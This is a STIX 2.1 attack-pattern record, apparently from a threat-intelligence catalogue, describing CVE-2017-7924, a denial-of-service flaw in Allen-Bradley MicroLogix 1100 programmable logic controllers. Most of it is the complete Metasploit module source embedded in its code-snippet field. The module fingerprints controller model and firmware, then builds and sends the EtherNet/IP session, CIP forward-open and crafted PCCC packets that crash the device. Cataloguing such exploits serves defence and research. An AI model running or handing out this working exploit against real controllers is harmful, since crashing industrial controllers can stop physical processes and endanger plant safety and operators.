{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--15e18696-a198-4c1b-be94-c3b06874920e",
    "created": "2024-08-14T16:24:49.205376Z",
    "modified": "2024-08-14T16:24:49.20538Z",
    "name": "\"DoS Exploitation of Allen-Bradleys Legacy Protocol (PCCC)\"",
    "description": " A remote, unauthenticated attacker could send a single, specially crafted Programmable Controller Communication Commands (PCCC) packet to the controller that could potentially cause the controller to enter a DoS condition. MicroLogix 1100 controllers are affected: 1763-L16BWA, 1763-L16AWA, 1763-L16BBB, and 1763-L16DWD.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/scada/allen_bradley_pccc.rb",
            "external_id": "allen_bradley_pccc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-7924"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ics/advisories/ICSA-17-138-03"
        },
        {
            "source_name": "reference",
            "url": "https://dl.acm.org/doi/10.1145/3174776.3174780"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(\n      'Name'           => \"DoS Exploitation of Allen-Bradley's Legacy Protocol (PCCC)\",\n      'Description'    => %q{\n        A remote, unauthenticated attacker could send a single, specially crafted\n        Programmable Controller Communication Commands (PCCC) packet to the controller\n        that could potentially cause the controller to enter a DoS condition.\n        MicroLogix 1100 controllers are affected: 1763-L16BWA, 1763-L16AWA, 1763-L16BBB, and\n        1763-L16DWD.\n        CVE-2017-7924 has been assigned to this vulnerability.\n        A CVSS v3 base score of 7.5 has been assigned.\n      },\n        'Author'         => [\n          'Jos\u00e9 Diogo Monteiro <jdlopes[at]student.dei.uc.pt>',\n          'Luis Rosa <lmrosa[at]dei.uc.pt>',\n          'Miguel Borges de Freitas <miguelbf[at]dei.uc.pt>'\n      ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n      [\n        [ 'CVE', '2017-7924' ],\n        [ 'URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-17-138-03' ],\n        [ 'URL', 'https://dl.acm.org/doi/10.1145/3174776.3174780']\n      ])\n      register_options([Opt::RPORT(44818),])\n  end\n\n  VULN_LIST = ['1763-L16BWA','1763-L16AWA','1763-L16BBB','1763-L16DWD']\n  VULN_FW_VERSION_MIN = 14.00\n  VULN_FW_VERSION_MAX = 16.00\n  def le_pp(s)\n    \"0x#{Rex::Text.to_hex(s, prefix=\"\").scan(/../).reverse.join(\"\")}\"\n  end\n\n  def enip_register_session_pkt\n    # ENIP encapsulation Header\n    \"\\x65\\x00\" + # Command register session (0x0065)\n    \"\\x04\\x00\" + # Lenght (4)\n    \"\\x00\\x00\\x00\\x00\" + # Session handle (0x00000000)\n    \"\\x00\\x00\\x00\\x00\" + # Status success (0x00000000)\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" + # Sender context (0x0000000000000000)\n    \"\\x00\\x00\\x00\\x00\" + # Options (0x00000000)\n    # Protocol Specific Data\n    \"\\x01\\x00\" + # Protocol version (1)\n    \"\\x00\\x00\" # Option flags (0x00000000)\n  end\n\n  def enip_ccm_forward_open_pkt(enip_session_handle)\n    # ENIP encapsulation header\n    \"\\x6f\\x00\" + # Send RR data (0x006f)\n    \"\\x3e\\x00\" + # Lenght (63)\n    enip_session_handle + # Session handle (retrieved from register session)\n    \"\\x00\\x00\\x00\\x00\" + # Status success (0x00000000)\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" + # Sender context (0x0000000000000000)\n    \"\\x00\\x00\\x00\\x00\" + # Options (0x00000000)\n    # Command specific data\n    \"\\x00\\x00\\x00\\x00\" + # Interface handle (CIP = 0x00000000)\n    \"\\x00\\x00\" + # Timeout (0)\n    \"\\x02\\x00\" + # Item count (2)\n    \"\\x00\\x00\" + # Item 1 type id (Null address item)\n    \"\\x00\\x00\" + # Item 1 length (0)\n    \"\\xb2\\x00\" + # Item 2 type id (Unconnected data item)\n    \"\\x2e\\x00\" + # Item 2 length (46)\n    # CIP Connection manager specific data\n    \"\\x54\\x02\\x20\\x06\\x24\\x01\\x0a\\xf0\" +\n    \"\\x00\\x00\\x00\\x00\\x52\\xac\\xda\\x89\" +\n    \"\\x55\\x0c\\x35\\x01\\xe1\\x08\\xb0\\x60\" +\n    \"\\x07\\x00\\x00\\x00\\x00\\x40\\x00\\x00\" +\n    \"\\x12\\x43\\x00\\x40\\x00\\x00\\x12\\x43\" +\n    \"\\xa3\\x02\\x20\\x02\\x24\\x01\"\n  end\n\n  # Any combination of File Number 0x02\u20130x08 and File Type 0x48 or 0x47 will trigger a Major Error (0x08)\n  def pccc_dos_pkt(enip_session_id, cip_connection_id)\n    # ENIP encapsulation header\n    \"\\x70\\x00\" + # Send unit data (0x0070)\n    \"\\x2d\\x00\" + # Length\n    enip_session_id + # ENIP session handle (obtained from enip register session)\n    \"\\x00\\x00\\x00\\x00\" + # Status Success\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" + # Sender context\n    \"\\x00\\x00\\x00\\x00\" + # Options\n    # Command Specific data\n    \"\\x00\\x00\\x00\\x00\" + # Interface handle (CIP)\n    \"\\x00\\x00\" + # Timeout (0)\n    \"\\x02\\x00\" + # Item count\n    \"\\xa1\\x00\" + # Item 1 - Type ID (Connected address item)\n    \"\\x04\\x00\" + # Item 1 - Length (4)\n    cip_connection_id + # CIP connection ID (obtained from CIP CM packet)\n    \"\\xb1\\x00\" + # Item 2 - Type ID (Connected data item)\n    \"\\x19\\x00\" + # Item 2 - Length (25)\n    \"\\x01\\x00\" + # Item 2 - CIP Sequence Count (1) - first packet\n    # PCCC Command data\n    \"\\x4b\" + # Execute PCCC (0x4b)\n    \"\\x02\\x20\\x67\\x24\\x01\" + # no idea what this is\n    \"\\x07\" + # Requestor ID length\n    \"\\x35\\x01\" + # CIP vendor ID\n    \"\\xe1\\x08\\xb0\\x60\" + # CIP serial number\n    \"\\x0f\" + # Command code\n    \"\\x00\" + # Status (success 0x00)\n    \"\\x2a\\x58\" + # Transaction code\n    \"\\xa2\" + # Function code (Protected typed logical read with three address fields)\n    \"\\x00\" + # Byte size\n    \"\\x05\" + # File number\n    \"\\x47\" + # File type\n    \"\\x00\" + # Element number\n    \"\\x00\" # Sub-element number\n  end\n\n  def enip_list_identify_pkt\n    \"\\x63\\x00\" + # List Identity\n    \"\\x00\\x00\" + # Length\n    \"\\x00\\x00\\x00\\x00\" + # Session Handle\n    \"\\x00\\x00\\x00\\x00\" + # Status: Success\n    \"\\x00\\x00\" + # Max Response Delay\n    \"\\x00\\x00\\xc1\\xde\\xbe\\xd1\" + # Sender Context\n    \"\\x00\\x00\\x00\\x00\" # Options\n  end\n\n\n  def check\n\n    connect_udp\n\n    udp_sock.put(enip_list_identify_pkt)\n    res = udp_sock.recvfrom(90)\n\n    disconnect_udp\n\n    unless res && res[0].length > 63 && res[0][0,2] == \"\\x63\\x00\"\n      print_error \"EtherNet/IP Packet Not Valid\"\n      return Exploit::CheckCode::Unsupported\n    end\n\n    revision = res[0][54,2]\n    product_name_len = res[0][62].unpack(\"c*\")[0]\n\n\n    product_name = res[0][63,product_name_len]\n    print_status \"Product Name: #{product_name}\"\n\n    array = product_name.split(' ')\n    plc_model = array[0]\n\n    return Exploit::CheckCode::Safe unless VULN_LIST.any? { |e| plc_model.include? e }\n\n    firmware = array[1]\n    begin\n      firmware_nbr = firmware.scan(/(\\d+[.,]\\d+)/).flatten.first.to_f\n      if firmware_nbr >= VULN_FW_VERSION_MIN && firmware_nbr < VULN_FW_VERSION_MAX\n        return Exploit::CheckCode::Vulnerable\n      elsif firmware_nbr < VULN_FW_VERSION_MIN\n        return Exploit::CheckCode::Appears\n      else\n        return Exploit::CheckCode::Safe\n      end\n    rescue\n      return Exploit::CheckCode::Unknown\n    end\n\n  rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e\n    elog(e)\n  ensure\n    disconnect\n  end\n\n  def run\n    connect\n    # Register Ethernet/IP session\n    sock.put(enip_register_session_pkt)\n    enip_register_session_ans = sock.get_once\n    unless enip_register_session_ans && enip_register_session_ans.length == 28 && enip_register_session_ans[0,2] == \"\\x65\\x00\"\n      print_error \"Ethernet/IP - Failed to create session.\"\n      disconnect\n      return\n    end\n    enip_session_id = enip_register_session_ans[4, 4]\n    print_status \"Ethernet/IP - Session created (id #{le_pp(enip_session_id)})\"\n\n    # Ethernet/IP CCM Forward Open\n    sock.put(enip_ccm_forward_open_pkt(enip_session_id))\n    enip_ccm_forward_open_ans = sock.get_once\n    unless enip_ccm_forward_open_ans && enip_ccm_forward_open_ans.length > 48 && enip_ccm_forward_open_ans[0,2] == \"\\x6f\\x00\"\n      print_error \"CIP Connection Manager - Failed Forward Open request\"\n      disconnect\n      return\n    end\n    cip_connection_id = enip_ccm_forward_open_ans[44, 4]\n    print_status \"CIP Connection Manager - Forward Open Success (Connection id #{le_pp(cip_connection_id)})\"\n\n    # PCCC DoS packet\n    print_status \"Sending PCCC DoS magic packet...\"\n    sock.put(pccc_dos_pkt(enip_session_id, cip_connection_id))\n\n  rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e\n    elog(e)\n  ensure\n    disconnect\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}